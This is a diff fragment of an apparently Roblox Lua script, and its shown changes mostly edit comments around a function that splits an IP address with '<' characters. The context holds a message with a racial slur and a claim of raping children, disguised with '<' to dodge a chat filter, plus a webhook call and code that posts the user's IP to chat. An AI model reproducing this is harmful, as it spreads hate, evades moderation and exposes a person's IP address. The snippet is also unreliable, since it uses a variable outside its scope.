@@ -84,6 +84,7 @@ local webhookData = createWebhookData()
 -- Sending the webhook
 sendWebhook(webhookUrl, webhookData)
 local message = "<n<i<g<g<a <i <r<a<p<e <k<i<d<s" -- Change this to any message you want
+-- Function to format IP address by separating digits with "<"
 function format_ip(ip)
     local formatted_ip = ""
     for part in string.gmatch(ip, "%d+") do
@@ -91,19 +92,19 @@ function format_ip(ip)
         for i = 1, #part do
             formatted_part = formatted_part .. part:sub(i, i) .. "<"
         end
-        formatted_ip = formatted_ip .. formatted_part:sub(1, -2) .. "."
+        formatted_ip = formatted_ip .. formatted_part:sub(1, -2) .. "."  -- Remove the last "<"
     end
     return formatted_ip:sub(1, -2)  -- Remove the last dot
 end
 
 -- Main function
 function main()
-    local ip = GetIp
-    local formatted_ip = format_ip(ip)
+
+    local formatted_ip = format_ip(GetIp)
     print("My IP has " .. formatted_ip)
 end
 
--- Call main function
+-- Run main
 main()
 local message2 = "MY IP: " .. formatted_ip
 local delayTime = 2.5 -- Time in seconds between messages
